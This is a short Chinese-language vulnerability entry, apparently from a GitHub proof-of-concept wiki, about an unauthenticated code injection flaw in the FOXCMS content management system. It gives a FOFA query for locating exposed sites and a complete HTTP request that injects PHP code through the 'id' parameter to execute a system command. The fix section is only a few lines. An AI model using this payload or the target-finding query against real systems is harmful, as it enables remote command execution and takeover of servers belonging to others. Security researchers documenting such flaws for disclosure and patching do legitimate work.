---
fofa: "body="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

#   FOXCMS黔狐内容管理系统 存在代码注入漏洞

# 漏洞描述

FOXCMS黔狐内容管理系统 存在代码注入漏洞，未经身份验证的攻击者执行恶意命令导致服务器被控。

# 影响版本

FOXCMS黔狐内容管理系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="foxcms-logo" || body="foxcms-container"

```
GET /images/index.html?id=%24{%40print(system(%22pwd%22))} HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

```

![image-20250326192853665](./.resource/FOXCMS黔狐内容管理系统存在代码注入漏洞/media/image-20250326192853665.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
